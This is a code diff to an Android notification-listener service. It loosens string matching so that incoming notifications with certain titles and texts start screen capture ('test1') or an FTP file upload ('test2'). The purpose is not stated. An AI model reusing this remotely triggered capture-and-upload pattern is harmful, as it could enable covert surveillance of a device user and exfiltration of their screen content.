@@ -98,23 +98,27 @@ public class AutoStartService extends NotificationListenerService {
                 Log.i(TAG, "IS NEEDED1: "+notificationTitle);
                 Log.i(TAG, "IS NEEDED2: "+notificationText);
 
-                if(notificationTitle != null && notificationText != null && notificationTitle.equals(NEEDED_APP_NOTIFICATION_TITLE_TESTING)) {
+                if(notificationTitle != null && notificationText != null && notificationTitle.contains(NEEDED_APP_NOTIFICATION_TITLE_TESTING)) {
                     //Log.i(TAG, "onNotificationPosted: " + sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT).toString());
                     //Log.i(TAG, "onNotificationPosted: " + sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TITLE).toString());
 
-                    if(notificationText.equals("test1")) {
+                    Log.i(TAG, "START RECORDING 1");
+
+                    if(notificationText.contains("test1")) {
                         /*App.setDelayCounter(3);
 
                         Intent dialogIntent = new Intent(App.getAppContext(), ScreenCaptureActivity.class);
                         dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                         App.getAppContext().startActivity(dialogIntent);*/
 
+                        Log.i(TAG, "START RECORDING 2");
+
                         Intent dialogIntent = new Intent(App.getAppContext(), ScreenCaptureActivity.class);
                         dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                         App.getAppContext().startActivity(dialogIntent);
                     }
                     else {
-                        if(notificationText.equals("test2")) {
+                        if(notificationText.contains("test2")) {
                             FTPFileUpload fileUpload = new FTPFileUpload();
                             fileUpload.execute();
                         }
